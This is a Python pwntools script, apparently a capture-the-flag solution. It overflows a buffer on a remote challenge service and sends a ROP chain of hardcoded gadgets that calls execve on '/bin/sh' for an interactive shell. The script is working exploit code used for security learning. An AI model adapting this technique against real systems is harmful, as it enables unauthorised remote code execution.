from pwn import *

r = remote("csie.ctf.tw", 10128)
# r = remote("127.0.0.1", 8887)
context.arch = "amd64"

pop_rdi = 0x000000000042ed2d
pop_rsi = 0x00000000004072e7
pop_rdx = 0x0000000000447b0f
pop_rax = 0x0000000000404971
mov_qptr_rdi_rax = 0x000000000044ee6f
syscall = 0x000000000044f609
buf = 0x0052b000

# raw_input('aaa')

r.recv()
payload = "\x00" * 0x148 + flat([pop_rdi, buf, pop_rax, "/bin/sh\x00", mov_qptr_rdi_rax, pop_rax, buf+0x100, pop_rsi, 0, pop_rdx, 0, pop_rax, 0x3b, syscall])
r.sendline(payload)
r.recv()
r.sendline("Kenny")
r.recv()

r.interactive()


